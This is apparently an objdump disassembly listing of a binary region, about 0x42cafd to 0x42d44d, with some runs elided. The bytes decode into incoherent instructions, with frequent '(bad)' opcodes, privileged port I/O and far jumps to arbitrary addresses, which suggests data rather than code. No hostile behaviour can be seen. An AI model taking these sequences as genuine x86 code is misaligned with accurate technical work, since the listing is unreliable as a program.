  42cafd:	mov    BYTE PTR [edx+ebx*1-0x22],bl
  42cb01:	je     0x42cb79
  42cb03:	ret    
  42cb04:	sbb    BYTE PTR [esi-0x47],dh
  42cb07:	adc    al,0xf
  42cb09:	call   0x1580:0x839c4e1b
  42cb10:	out    0x3f,al
  42cb12:	sbb    ecx,eax
  42cb14:	outs   dx,DWORD PTR ds:[esi]
  42cb15:	outs   dx,DWORD PTR ds:[esi]
  42cb16:	int3   
  42cb17:	test   eax,0x26f9b96d
  42cb1c:	shr    cl,0xa1
  42cb1f:	fmul   QWORD PTR [ecx+0x31d3bd1b]
  42cb25:	jmp    0xa50634f4
  42cb2a:	ins    DWORD PTR es:[edi],dx
  42cb2b:	jnp    0x42cba8
  42cb2d:	mov    DWORD PTR [eax],ecx
  42cb2f:	jnp    0x42cafb
  42cb31:	aam    0xa6
  42cb33:	mov    DWORD PTR [edx-0x71a5b9d2],0xa1870384
  42cb3d:	cmp    BYTE PTR [eax+0x36],dl
  42cb40:	mov    ch,0xb6
  42cb42:	jae    0x42cb9c
  42cb44:	stc    
  42cb45:	or     BYTE PTR [ebx-0x42f79ad5],ah
  42cb4b:	pop    eax
  42cb4c:	loopne 0x42cb6f
  42cb4e:	mov    WORD PTR [ecx],cs
  42cb50:	sbb    ecx,esp
  42cb52:	mov    ebp,0x3f4c2df4
  42cb57:	adc    BYTE PTR [ebx+0x68],dl
  42cb5a:	(bad)  [esi-0x4c556e7c]
  42cb60:	cmc    
  42cb61:	in     al,0xca
  42cb63:	repz imul edi,DWORD PTR [ecx+0x2d],0x530f22bc
  42cb6b:	sar    BYTE PTR [eax],cl
  42cb6d:	mov    edx,0x1020ecec
  42cb72:	push   eax
  42cb73:	pop    ecx
  42cb74:	inc    ebp
  42cb75:	xor    DWORD PTR [ebp-0x1219b1b8],ebx
  42cb7b:	pop    es
  42cb7c:	int3   
  42cb7d:	add    ebx,edi
  42cb7f:	pop    ds
  42cb80:	xor    al,0xa0
  42cb82:	adc    al,0x3e
  42cb84:	dec    ecx
  42cb85:	or     al,BYTE PTR [esi+0x6bfad4de]
  42cb8b:	push   esi
  42cb8c:	jbe    0x42cba7
  42cb8e:	stos   DWORD PTR es:[edi],eax
  42cb8f:	mov    ch,0x9
  42cb91:	xchg   edi,eax
  42cb92:	fst    DWORD PTR [edx]
  42cb94:	arpl   WORD PTR ds:0x5a74b2e9,bx
  42cb9a:	mov    ecx,0xdf1e23fd
  42cb9f:	jb     0x42cc1b
  42cba1:	cmc    
  42cba2:	pop    edi
  42cba3:	out    0xc4,eax
  42cba5:	loopne 0x42cba8
  42cba7:	add    BYTE PTR ds:0x47c0787e,ah
  42cbad:	xor    bh,BYTE PTR [esi+ebx*8]
  42cbb0:	(bad)  
  42cbb1:	mov    ebx,0x5755a4
	...
  42cc16:	jg     0x42cc1a
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	sub    BYTE PTR [edx],bl
  42cc24:	jo     0x42cbc0
  42cc26:	sub    al,0xdf
  42cc28:	add    DWORD PTR [eax],eax
  42cc2a:	pop    es
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [ecx],ch
  42cc2f:	jno    0x42cc2c
  42cc31:	push   ss
  42cc32:	or     al,0x7e
  42cc34:	mov    bh,0x3b
  42cc36:	test   al,0x7d
  42cc38:	cwde   
  42cc39:	imul   ecx,eax,0xfffffffa
  42cc3c:	mov    dh,0xce
  42cc3e:	sub    cl,cl
  42cc40:	sub    bh,bl
  42cc42:	and    ecx,DWORD PTR [esi]
  42cc44:	jmp    0x42cc07
  42cc46:	push   ecx
  42cc47:	mov    ah,0xd1
  42cc49:	ret    0x8d88
  42cc4c:	mov    eax,0x57d27832
  42cc51:	xchg   esp,eax
  42cc52:	int3   
  42cc53:	(bad)  
  42cc54:	fwait
  42cc55:	data16 and al,0x20
  42cc58:	daa    
  42cc59:	retf   
  42cc5a:	sbb    BYTE PTR [ebx],ah
  42cc5c:	(bad)  
  42cc5d:	aad    0x59
  42cc5f:	push   esi
  42cc60:	xchg   ch,al
  42cc62:	pop    ss
  42cc63:	push   ebx
  42cc64:	sbb    edx,ebx
  42cc66:	xor    edi,ebp
  42cc68:	mov    bl,0x96
  42cc6a:	je     0x42cc2b
  42cc6c:	loop   0x42cc50
  42cc6e:	mov    ds,ebx
  42cc70:	xor    eax,0xf4cc9ead
  42cc75:	(bad)  
  42cc76:	fs icebp 
  42cc78:	push   eax
  42cc79:	jle    0x42cbfc
  42cc7b:	pusha  
  42cc7c:	(bad)  
  42cc7d:	and    eax,0xdd0ff2a
  42cc82:	push   cs
  42cc83:	inc    esp
  42cc84:	in     eax,0xb9
  42cc86:	lds    edx,FWORD PTR ds:0x9ca31a17
  42cc8c:	or     dh,dl
  42cc8e:	call   0xb89cfcb2
  42cc93:	fsubr  DWORD PTR [esi+0x59af88ff]
  42cc99:	dec    ecx
  42cc9a:	jno    0x42cc2d
  42cc9c:	lods   al,BYTE PTR ds:[esi]
  42cc9d:	outs   dx,BYTE PTR ds:[esi]
  42cc9e:	or     al,0x67
  42cca0:	data16 repz jecxz 0x42cc7c
  42cca4:	mov    ?,WORD PTR [edi+eax*4+0x43fc38a]
  42ccab:	dec    ebx
  42ccac:	sti    
  42ccad:	or     esi,DWORD PTR [edi+0x391e4b8f]
  42ccb3:	mov    bh,0x2e
  42ccb5:	lods   eax,DWORD PTR ds:[esi]
  42ccb6:	sub    esi,esp
  42ccb8:	sbb    eax,0x4e41506c
  42ccbd:	lods   al,BYTE PTR ds:[esi]
  42ccbe:	xchg   BYTE PTR [eax+eax*8+0x47],cl
  42ccc2:	jp     0x42cccc
  42ccc4:	inc    edi
  42ccc5:	ficom  WORD PTR [ebp-0x1d]
  42ccc8:	mov    bh,0xa6
  42ccca:	jmp    0xa1647e94
  42cccf:	cli    
  42ccd0:	push   ds
  42ccd1:	loopne 0x42cca6
  42ccd3:	popf   
  42ccd4:	mov    bh,0x95
  42ccd6:	jb     0x42cc8b
  42ccd8:	mov    eax,0xe81cb500
  42ccdd:	fbld   TBYTE PTR [esi]
  42ccdf:	inc    edi
  42cce0:	sti    
  42cce1:	add    esi,DWORD PTR [ecx+0x7f57d598]
  42cce7:	pop    ebx
  42cce8:	shr    BYTE PTR [edi-0x59],cl
  42cceb:	cs push esi
  42cced:	repz push edx
  42ccef:	or     BYTE PTR [edi-0xa],al
  42ccf2:	and    BYTE PTR [ecx+esi*4+0x26503e94],dl
  42ccf9:	add    eax,0xfacfeb90
  42ccfe:	call   0xcd422b34
  42cd03:	outs   dx,DWORD PTR ds:[esi]
  42cd04:	bound  esp,QWORD PTR [esi+0x746462a3]
  42cd0a:	and    eax,DWORD PTR [edi]
  42cd0c:	sbb    edx,ecx
  42cd0e:	out    dx,al
  42cd0f:	and    BYTE PTR [eax],bh
  42cd11:	fsubr  DWORD PTR [eax]
  42cd13:	stc    
  42cd14:	lods   eax,DWORD PTR ds:[esi]
  42cd15:	pop    es
  42cd16:	pop    ebp
  42cd17:	mov    esp,0xc1a4bd05
  42cd1c:	adc    bl,BYTE PTR [eax]
  42cd1e:	cwde   
  42cd1f:	out    dx,al
  42cd20:	dec    BYTE PTR [edx+0x159b1753]
  42cd26:	and    ebp,DWORD PTR [eax+esi*2]
  42cd29:	mov    ?,WORD PTR [edx+0x449ec4cc]
  42cd2f:	(bad)  
  42cd30:	cld    
  42cd31:	test   esi,0xbd7d
	...
  42cd93:	add    BYTE PTR [eax],al
  42cd95:	add    BYTE PTR [ecx],bl
  42cd97:	mov    eax,ds:0xdffe87fe
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	or     eax,0x33372e85
  42cda7:	loopne 0x42cdaa
  42cda9:	add    BYTE PTR [edi],al
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [esi+0xe],bh
  42cdb0:	nop
  42cdb1:	in     al,dx
  42cdb2:	les    eax,FWORD PTR [eax+0x8e94c7d]
  42cdb8:	dec    ebx
  42cdb9:	outs   dx,BYTE PTR ds:[esi]
  42cdba:	jmp    0x42cdc4
  42cdbc:	aam    0xfb
  42cdbe:	xchg   ebp,ecx
  42cdc0:	add    DWORD PTR [ebx],ebx
  42cdc2:	ror    esi,cl
  42cdc4:	xor    eax,0x36316c21
  42cdc9:	push   ecx
  42cdca:	dec    eax
  42cdcb:	and    edx,esi
  42cdcd:	push   es
  42cdce:	pop    ecx
  42cdcf:	int3   
  42cdd0:	push   esp
  42cdd1:	push   esp
  42cdd2:	rol    DWORD PTR [eax],1
  42cdd4:	repnz pop es
  42cdd6:	and    edx,DWORD PTR [ecx-0xfc720f9]
  42cddc:	leave  
  42cddd:	bound  edi,QWORD PTR [esi+edx*8-0x25216f24]
  42cde4:	loope  0x42ce46
  42cde6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cde7:	inc    esi
  42cde8:	out    dx,al
  42cde9:	iret   
  42cdea:	or     eax,DWORD PTR [eax+eax*4+0x36]
  42cdee:	mov    edi,0x2ef9a463
  42cdf3:	je     0x42ce3e
  42cdf5:	xchg   BYTE PTR [edx-0x63],bl
  42cdf8:	loope  0x42cd8a
  42cdfa:	iret   
  42cdfb:	and    bh,BYTE PTR [edx]
  42cdfd:	pop    DWORD PTR [esi-0x1e]
  42ce00:	repnz ror BYTE PTR [ebx+0x1e1da701],cl
  42ce07:	pop    edi
  42ce08:	jns    0x42ce3f
  42ce0a:	mul    BYTE PTR ds:0xae1b5a88
  42ce10:	mov    ebp,0x232073b6
  42ce15:	and    eax,eax
  42ce17:	jo     0x42ce22
  42ce19:	js     0x42cdda
  42ce1b:	xchg   edx,eax
  42ce1c:	lea    ebx,[ebx]
  42ce1e:	out    0xcb,eax
  42ce20:	adc    DWORD PTR [eax+0x67],esi
  42ce23:	addr16 mov eax,cs
  42ce26:	dec    edx
  42ce27:	mov    BYTE PTR [edx+0x35],dh
  42ce2a:	mov    esp,0x8305989
  42ce2f:	fisub  DWORD PTR [esi]
  42ce31:	or     DWORD PTR [edi],eax
  42ce33:	inc    ebx
  42ce34:	jg     0x42ceb5
  42ce36:	sti    
  42ce37:	daa    
  42ce38:	pop    ecx
  42ce39:	sbb    BYTE PTR [edi+0x7e3aa670],0x14
  42ce40:	mov    ah,0xe9
  42ce42:	popf   
  42ce43:	lahf   
  42ce44:	push   ecx
  42ce45:	push   edx
  42ce46:	mov    al,0xff
  42ce48:	sar    DWORD PTR [esi-0x26],1
  42ce4b:	jl     0x42cdfc
  42ce4d:	sub    edx,DWORD PTR [ebp-0x7b4c507b]
  42ce53:	sbb    BYTE PTR [edi],ch
  42ce55:	inc    esi
  42ce56:	mov    dl,0x55
  42ce58:	mov    fs,ebx
  42ce5a:	sbb    BYTE PTR [ebx+0x2e],dh
  42ce5d:	scas   al,BYTE PTR es:[edi]
  42ce5e:	dec    ecx
  42ce5f:	test   eax,0x719cc32f
  42ce64:	inc    edx
  42ce65:	shl    BYTE PTR [edx-0x75d1cdf],1
  42ce6b:	(bad)  
  42ce6c:	cld    
  42ce6d:	hlt    
  42ce6e:	fst    DWORD PTR [esi+0x69]
  42ce71:	adc    BYTE PTR [esi],ch
  42ce73:	aaa    
  42ce74:	jmp    0xf370ce7c
  42ce79:	leave  
  42ce7a:	mov    ah,0x77
  42ce7c:	push   esp
  42ce7d:	pop    ds
  42ce7e:	xor    BYTE PTR ds:0x6535f7cd,dh
  42ce84:	mov    al,ds:0xac3f4c7a
  42ce89:	jmp    0x42ce38
  42ce8b:	aad    0x1a
  42ce8d:	mov    ebx,0xeedf9838
  42ce92:	inc    esi
  42ce93:	or     BYTE PTR [ebp-0x7d],bl
  42ce96:	nop
  42ce97:	or     bl,BYTE PTR [edi-0x28a7e78e]
  42ce9d:	sbb    ecx,DWORD PTR [esi-0x14e9710d]
  42cea3:	stos   DWORD PTR es:[edi],eax
  42cea4:	jnp    0x42ce4a
  42cea6:	jbe    0x42cf21
  42cea8:	fsubr  st(3),st
  42ceaa:	stos   DWORD PTR es:[edi],eax
  42ceab:	lods   al,BYTE PTR ds:[esi]
  42ceac:	sbb    ebp,DWORD PTR [esi]
  42ceae:	push   ds
  42ceaf:	sub    al,0xb3
  42ceb1:	inc    ah
  42ceb3:	adc    dl,ah
	...
  42cf15:	add    BYTE PTR [ebx+0x3d],dh
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx-0x4a10d2ef]
  42cf24:	xchg   ecx,eax
  42cf25:	or     BYTE PTR [edx],bh
  42cf27:	loope  0x42cf2a
  42cf29:	add    BYTE PTR [edi],al
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    cl,al
  42cf2f:	sub    eax,0x9fc02cd
  42cf34:	les    ebp,FWORD PTR [ebp+ebx*1-0x6d41d73c]
  42cf3b:	(bad)  
  42cf3d:	(bad)  
  42cf3e:	mov    DWORD PTR [ebp-0x4715278e],edi
  42cf44:	xlat   BYTE PTR ds:[ebx]
  42cf45:	push   ds
  42cf46:	cmp    al,0x62
  42cf48:	in     eax,0x2a
  42cf4a:	pop    ebx
  42cf4b:	sbb    ah,BYTE PTR [esp+ebp*4+0x663283a9]
  42cf52:	push   eax
  42cf53:	stos   DWORD PTR es:[edi],eax
  42cf54:	sub    al,BYTE PTR [ebx+0x36a16033]
  42cf5a:	outs   dx,BYTE PTR ds:[esi]
  42cf5b:	add    esi,edx
  42cf5d:	xlat   BYTE PTR ds:[ebx]
  42cf5e:	jns    0x42cfdb
  42cf60:	add    ah,cl
  42cf62:	outs   dx,BYTE PTR ds:[esi]
  42cf63:	add    al,ah
  42cf65:	jno    0x42cf7b
  42cf67:	adc    ah,ah
  42cf69:	sbb    DWORD PTR [eax+esi*8+0x5f],ecx
  42cf6d:	sub    esp,DWORD PTR [ecx-0x1b]
  42cf70:	mov    ecx,0xf257e3b5
  42cf75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf76:	add    eax,0x611228b3
  42cf7b:	add    DWORD PTR [esi+edi*4-0x22],edx
  42cf7f:	cli    
  42cf80:	xor    BYTE PTR [eax-0x35],dl
  42cf83:	jb     0x42cf9d
  42cf85:	mov    ebx,0xf72e2a1b
  42cf8a:	push   ss
  42cf8b:	out    0xe8,eax
  42cf8d:	add    eax,0x95bdc4e2
  42cf92:	push   cs
  42cf93:	jnp    0x42cfa4
  42cf95:	cwde   
  42cf96:	jl     0x42cf6e
  42cf98:	(bad)  
  42cf99:	cld    
  42cf9a:	sbb    DWORD PTR [eax-0x16f9fe97],ecx
  42cfa0:	add    BYTE PTR [ecx],bh
  42cfa2:	dec    ebp
  42cfa3:	(bad)  
  42cfa4:	repnz call 0x1b23:0x68e04f7b
  42cfac:	sub    bl,ch
  42cfae:	mov    ch,0xb2
  42cfb0:	fst    QWORD PTR [edx+0x8]
  42cfb3:	retf   
  42cfb4:	out    0x88,eax
  42cfb6:	stos   DWORD PTR es:[edi],eax
  42cfb7:	xor    DWORD PTR [esi],edx
  42cfb9:	call   0x15cfc00c
  42cfbe:	js     0x42cfe8
  42cfc0:	and    ch,BYTE PTR [ebx-0x77]
  42cfc3:	push   es
  42cfc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cfc5:	scas   eax,DWORD PTR es:[edi]
  42cfc6:	pop    esi
  42cfc7:	inc    ebx
  42cfc8:	test   eax,0x5dca1a56
  42cfcd:	push   esi
  42cfce:	adc    dl,BYTE PTR [eax]
  42cfd0:	xchg   esi,eax
  42cfd1:	nop
  42cfd2:	adc    eax,0xacb1013e
  42cfd7:	mov    cs,WORD PTR [ebp+esi*4+0x3bc4d4b]
  42cfde:	dec    ebx
  42cfdf:	mov    eax,0x7571e6d7
  42cfe4:	add    eax,0xde5c36c3
  42cfe9:	xor    ch,BYTE PTR [esi]
  42cfeb:	xlat   BYTE PTR ds:[ebx]
  42cfec:	loopne 0x42d017
  42cfee:	mov    edi,0x77b03fe2
  42cff3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cff5:	ds or  al,0xec
  42cff8:	cmp    al,0x5b
  42cffa:	fcom   QWORD PTR [edx]
  42cffc:	std    
  42cffd:	pop    edx
  42cffe:	inc    edx
  42cfff:	jge    0x42cfa8
  42d001:	jo     0x42cf84
  42d003:	jb     0x42cf87
  42d005:	jns    0x42d051
  42d007:	and    ah,BYTE PTR [ebx+ebp*8-0x2f313f77]
  42d00e:	xlat   BYTE PTR ds:[ebx]
  42d00f:	dec    eax
  42d010:	lods   eax,DWORD PTR ds:[esi]
  42d011:	sbb    BYTE PTR [eax-0x4d],dh
  42d014:	stos   BYTE PTR es:[edi],al
  42d015:	fldenv [ebx]
  42d017:	test   al,0x7b
  42d019:	pop    edx
  42d01a:	jo     0x42cfa1
  42d01c:	cs aam 0x70
  42d01f:	jne    0x42d091
  42d021:	cs je  0x42cfd1
  42d024:	retf   0x2b8d
  42d027:	and    ebx,DWORD PTR [edi+ebp*8+0x633adcb8]
  42d02e:	sub    eax,0x83df5c16
  42d033:	retf   
  42d034:	xchg   esp,eax
	...
  42d095:	add    BYTE PTR [eax+0x3a],dl
  42d098:	(bad)  
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	mov    ebp,0x4127b7fd
  42d0a7:	loop   0x42d0aa
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    BYTE PTR [ecx],dh
  42d0af:	and    eax,0x43ebea89
  42d0b4:	jp     0x42d10e
  42d0b6:	in     eax,0x3f
  42d0b8:	mov    ah,BYTE PTR [eax]
  42d0ba:	sbb    ch,al
  42d0bc:	cmp    DWORD PTR [ebp+0x27],0x48
  42d0c0:	das    
  42d0c1:	sbb    eax,0xce6beec8
  42d0c6:	pop    esi
  42d0c7:	ds push ecx
  42d0c9:	sbb    esi,DWORD PTR [ecx-0x541f7fc2]
  42d0cf:	inc    ebx
  42d0d0:	and    al,0x7e
  42d0d2:	fist   WORD PTR [edx+0x27]
  42d0d5:	mov    ah,0x73
  42d0d7:	fld    DWORD PTR [ebx]
  42d0d9:	sbb    al,0xb7
  42d0db:	dec    eax
  42d0dc:	mov    cl,0xfa
  42d0de:	test   DWORD PTR [ebp+0x74b29aed],edx
  42d0e4:	or     ebx,ebp
  42d0e6:	call   0x9a35:0xf852b4fa
  42d0ed:	adc    al,0x15
  42d0ef:	hlt    
  42d0f0:	adc    eax,0xef1b593
  42d0f5:	retf   0xc6f8
  42d0f8:	and    DWORD PTR [ebp-0x1e],0x21670222
  42d0ff:	push   esp
  42d100:	pop    ebp
  42d101:	xchg   BYTE PTR [edi+0x2e],al
  42d104:	inc    edi
  42d105:	adc    esp,edi
  42d107:	ret    
  42d108:	je     0x42d0d1
  42d10a:	into   
  42d10b:	xchg   ch,bh
  42d10d:	imul   esi,DWORD PTR [esi+0x514ab6e0],0x41
  42d114:	in     eax,0xfd
  42d116:	mov    al,0x59
  42d118:	(bad)  
  42d119:	das    
  42d11a:	loopne 0x42d11a
  42d11c:	push   ecx
  42d11d:	call   0x413c:0x611d7744
  42d124:	dec    edi
  42d125:	fwait
  42d126:	pushf  
  42d127:	inc    eax
  42d128:	push   es
  42d129:	push   ds
  42d12a:	retf   
  42d12b:	fs adc al,0xb8
  42d12e:	mov    eax,0x45164fcf
  42d133:	or     al,BYTE PTR [esi+0x44]
  42d136:	pop    edx
  42d137:	or     BYTE PTR [esi-0x6a],dl
  42d13a:	daa    
  42d13b:	test   DWORD PTR [ebx+eax*2-0x57e67696],ebp
  42d142:	mul    BYTE PTR [ecx-0x70caf619]
  42d148:	sub    al,0xb9
  42d14a:	cmp    BYTE PTR [esi+0x56a2c550],cl
  42d150:	retf   
  42d151:	out    dx,al
  42d152:	push   ebp
  42d153:	pavgw  mm4,QWORD PTR [ebx-0x6fee1ac3]
  42d15a:	out    0x55,eax
  42d15c:	xchg   ebx,eax
  42d15d:	adc    dh,BYTE PTR [ebx]
  42d15f:	mov    bl,0x0
  42d161:	stos   DWORD PTR es:[edi],eax
  42d162:	xor    eax,0x48338099
  42d167:	jns    0x42d129
  42d169:	add    BYTE PTR [ecx],dh
  42d16b:	add    ebp,DWORD PTR [edi+0x17aee904]
  42d171:	xor    ecx,DWORD PTR [edx]
  42d173:	js     0x42d1bd
  42d175:	mov    ah,0xa3
  42d177:	pushf  
  42d178:	dec    ecx
  42d179:	push   edi
  42d17a:	arpl   WORD PTR [esp+edi*8+0x24],ax
  42d17e:	test   DWORD PTR [ecx+0x43],edi
  42d181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d182:	sub    edx,ecx
  42d184:	and    al,0x27
  42d186:	daa    
  42d187:	pop    edx
  42d188:	(bad)  
  42d189:	fbld   TBYTE PTR [eax+0x549c4498]
  42d18f:	and    DWORD PTR [eiz*4-0x4be4e107],edx
  42d196:	pop    esp
  42d197:	and    BYTE PTR [eax+0x22],bl
  42d19a:	aas    
  42d19b:	pusha  
  42d19c:	ret    
  42d19d:	push   0xffffffb5
  42d19f:	pusha  
  42d1a0:	pop    ss
  42d1a1:	rcl    BYTE PTR [eax+0x1f],cl
  42d1a4:	dec    edx
  42d1a5:	cld    
  42d1a6:	xchg   edi,eax
  42d1a7:	push   cs
  42d1a8:	out    dx,eax
  42d1a9:	icebp  
  42d1aa:	sub    eax,0x2d1428ef
  42d1af:	pushf  
  42d1b0:	cmp    bl,BYTE PTR cs:[eax+0xb224]
	...
  42d213:	add    BYTE PTR [eax],al
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	(bad)  
  42d223:	cld    
  42d224:	repz jmp 0x107:0x1e348
  42d22c:	add    BYTE PTR [eax],al
  42d22e:	dec    ebx
  42d22f:	mov    ds:0x5cfcd9a3,al
  42d234:	outs   dx,DWORD PTR ds:[esi]
  42d235:	shl    esp,0x36
  42d238:	aaa    
  42d239:	mov    al,0xee
  42d23b:	sar    DWORD PTR [ebx-0x2dca512d],cl
  42d241:	cmp    BYTE PTR [edi-0x7c],0x9f
  42d245:	scas   eax,DWORD PTR es:[edi]
  42d246:	mov    edi,0x8e0ff54f
  42d24b:	outs   dx,BYTE PTR ds:[esi]
  42d24c:	cmp    bl,dl
  42d24e:	adc    DWORD PTR ds:0x90d2fd9e,eax
  42d254:	push   bx
  42d256:	popa   
  42d257:	gs xchg ebx,eax
  42d259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d25a:	(bad)  
  42d25b:	jb     0x42d27f
  42d25d:	dec    edx
  42d25e:	mov    ah,0x17
  42d260:	jmp    0x54ae0f93
  42d265:	(bad)  
  42d266:	out    dx,al
  42d267:	sub    al,0x3e
  42d269:	pop    ebp
  42d26a:	sub    BYTE PTR [ebx-0x53],dl
  42d26d:	push   ecx
  42d26e:	and    dl,BYTE PTR [edx-0x8870a55]
  42d274:	je     0x42d222
  42d276:	inc    esi
  42d277:	dec    ecx
  42d278:	(bad)  
  42d279:	mov    bl,0x7d
  42d27b:	ret    
  42d27c:	inc    ebp
  42d27d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d27e:	ins    BYTE PTR es:[edi],dx
  42d27f:	mov    ch,dh
  42d281:	ja     0x42d27c
  42d283:	popf   
  42d284:	cmp    ebx,edi
  42d286:	pop    ecx
  42d287:	(bad)  
  42d288:	not    BYTE PTR [ebx]
  42d28a:	int    0xae
  42d28c:	mov    bh,0x74
  42d28e:	cmp    al,0xb7
  42d290:	enter  0x77a0,0x5b
  42d294:	ficomp DWORD PTR ds:0x41bef3c8
  42d29a:	cs leave 
  42d29c:	jl     0x42d23b
  42d29e:	sbb    dh,BYTE PTR [edi+0x4fc62e8c]
  42d2a4:	stc    
  42d2a5:	std    
  42d2a6:	cmp    dl,BYTE PTR ds:0x79d9a05b
  42d2ac:	pop    esi
  42d2ad:	js     0x42d23b
  42d2af:	mov    eax,ds:0xa729716e
  42d2b4:	adc    ebx,DWORD PTR [edx-0x3f5d08c7]
  42d2ba:	jnp    0x42d2f8
  42d2bc:	out    dx,al
  42d2bd:	outs   dx,DWORD PTR ds:[esi]
  42d2be:	pop    ds
  42d2bf:	inc    ecx
  42d2c0:	jp     0x42d30d
  42d2c2:	add    DWORD PTR [eax+0x3d],ebp
  42d2c5:	xchg   ebp,eax
  42d2c6:	fst    QWORD PTR [edi-0x37]
  42d2c9:	ss jns 0x42d2e4
  42d2cc:	or     dl,BYTE PTR [esi]
  42d2ce:	enter  0x9714,0xdd
  42d2d2:	dec    esi
  42d2d3:	ss dec ebp
  42d2d5:	pop    ss
  42d2d6:	das    
  42d2d7:	xchg   edx,eax
  42d2d8:	push   0x7f
  42d2da:	(bad)  
  42d2db:	mov    ebp,esp
  42d2dd:	jo     0x42d320
  42d2df:	add    DWORD PTR [ebx+0x20c2abfb],edi
  42d2e5:	mov    bl,0xc0
  42d2e7:	repz xchg esi,eax
  42d2e9:	aam    0x44
  42d2eb:	mov    dh,0x2a
  42d2ed:	pop    ds
  42d2ee:	test   al,0x9e
  42d2f0:	dec    esp
  42d2f1:	nop
  42d2f2:	xchg   ecx,eax
  42d2f3:	xor    al,0x4e
  42d2f5:	test   ah,cl
  42d2f7:	shl    BYTE PTR [esi-0x17],cl
  42d2fa:	mov    BYTE PTR [eax-0x32],dl
  42d2fd:	cld    
  42d2fe:	(bad)  
  42d2ff:	cld    
  42d300:	or     BYTE PTR [bp+di+0x23df],bl
  42d305:	xchg   edx,eax
  42d306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d307:	sub    dl,ch
  42d309:	loope  0x42d305
  42d30b:	daa    
  42d30c:	pop    edi
  42d30d:	out    0x46,eax
  42d30f:	in     eax,dx
  42d310:	mov    dh,0xaa
  42d312:	cld    
  42d313:	push   ss
  42d314:	in     al,0x6a
  42d316:	daa    
  42d317:	ja     0x42d2be
  42d319:	mov    edx,DWORD PTR [ecx-0xf]
  42d31c:	lock aad 0xd8
  42d31f:	push   ecx
  42d320:	xchg   eax,eax
  42d322:	mov    ?,WORD PTR [ecx-0x4c]
  42d325:	inc    esi
  42d326:	mov    dl,BYTE PTR [esp+esi*1+0x7e]
  42d32a:	pusha  
  42d32b:	and    bh,ah
  42d32d:	data16 mov bh,0x23
  42d330:	scas   eax,DWORD PTR es:[edi]
  42d331:	cmc    
  42d332:	test   DWORD PTR [ebx+eiz*4+0x0],ecx
	...
  42d396:	ror    esi,0x63
  42d399:	cdq    
  42d39a:	outs   dx,DWORD PTR ds:[esi]
  42d39b:	mov    ebp,0x9c38defb
  42d3a0:	int3   
  42d3a1:	pop    eax
  42d3a2:	test   BYTE PTR [edi-0x2c],ah
  42d3a5:	xor    DWORD PTR [edi-0x1c],ecx
  42d3a8:	add    DWORD PTR [eax],eax
  42d3aa:	pop    es
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    BYTE PTR [ecx-0x24],dh
  42d3b0:	sub    eax,0x6105d790
  42d3b5:	popf   
  42d3b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3b7:	adc    dh,al
  42d3b9:	gs mov dl,al
  42d3bc:	sbb    al,0x5
  42d3be:	and    edi,esi
  42d3c0:	rol    BYTE PTR [ebp-0xb],cl
  42d3c3:	ins    BYTE PTR es:[edi],dx
  42d3c4:	in     al,0x43
  42d3c6:	jg     0x42d3ce
  42d3c8:	jge    0x42d41d
  42d3ca:	inc    ebp
  42d3cb:	dec    edx
  42d3cc:	push   ebx
  42d3cd:	sub    DWORD PTR [ebp-0x7a5089a2],esp
  42d3d3:	mov    dh,0xb7
  42d3d5:	mov    BYTE PTR [ecx-0x18017f30],dl
  42d3db:	nop
  42d3dc:	push   es
  42d3dd:	sub    BYTE PTR [edx+0x3],ch
  42d3e0:	or     BYTE PTR [edi],dh
  42d3e2:	inc    edi
  42d3e3:	or     eax,0x358fd67a
  42d3e8:	push   0xd1b3c5d7
  42d3ed:	mov    esp,0x417ba803
  42d3f2:	push   ebp
  42d3f3:	cmp    eax,0x991e85fa
  42d3f8:	fimul  WORD PTR [edx+0x4a]
  42d3fb:	fld    TBYTE PTR [edx+ecx*2]
  42d3fe:	mov    eax,ds:0x80c59120
  42d403:	mov    al,ds:0x63106b12
  42d408:	jp     0x42d3ac
  42d40a:	jmp    0xb4bf:0xb9db42d7
  42d411:	push   edi
  42d412:	ret    
  42d413:	sub    ebp,esi
  42d415:	sub    BYTE PTR [edi],dh
  42d417:	mov    al,0xbe
  42d419:	mov    BYTE PTR [edx+0x2590dad8],bl
  42d41f:	sub    bh,BYTE PTR [ecx+ebx*8]
  42d422:	cli    
  42d423:	(bad)  
  42d424:	in     eax,0x68
  42d426:	dec    edi
  42d427:	popa   
  42d428:	neg    bh
  42d42a:	out    dx,eax
  42d42b:	sbb    ebp,DWORD PTR [edi-0x22]
  42d42e:	(bad)  
  42d42f:	mul    esp
  42d431:	pop    es
  42d432:	jmp    0x2f84:0x38f7a5a9
  42d439:	(bad)  
  42d43a:	enter  0x7d08,0x40
  42d43e:	mov    ebp,DWORD PTR [ebx]
  42d440:	push   0xccad3d6
  42d445:	icebp  
  42d446:	xor    ebx,ebp
  42d448:	add    eax,0x27b8b499
  42d44d:	jg     0x42d482
